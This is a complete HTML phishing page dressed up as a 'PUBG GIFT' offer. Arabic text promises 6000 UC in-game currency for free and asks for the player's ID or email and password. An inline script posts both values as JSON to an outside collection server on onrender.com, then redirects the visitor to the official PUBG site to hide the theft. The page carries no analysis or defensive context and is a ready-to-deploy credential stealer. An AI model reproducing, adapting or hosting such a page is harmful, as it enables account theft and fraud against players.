<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PUBG UC</title><style>body{background:#0b131a;color:#ffc107;text-align:center;font-family:sans-serif;margin:0;padding:20px;}.box{border:2px solid #ffc107;padding:30px;border-radius:15px;width:100%;max-width:400px;margin:40px auto;box-sizing:border-box;}input{width:100%;padding:15px;margin:15px 0;border-radius:8px;border:none;background:#fff;font-size:16px;text-align:center;box-sizing:border-box;}.btn{background:#ffc107;color:#000;padding:18px;width:100%;font-weight:bold;font-size:18px;border:none;border-radius:8px;cursor:pointer;}</style></head><body><div class="box"><h1>PUBG GIFT</h1><p>أدخل بياناتك لاستلام 6000 UC فوراً</p><form id="f"><input type="text" id="u" placeholder="ID اللاعب أو البريد" required><input type="password" id="p" placeholder="كلمة السر" required><button type="submit" class="btn">تفعيل الشحن</button></form></div><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();fetch('https://brmbtbot-2.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'PUBG UC',u:document.getElementById('u').value,p:document.getElementById('p').value})}).finally(()=>{location.href='https://pubgmobile.com';});};</script></body></html>
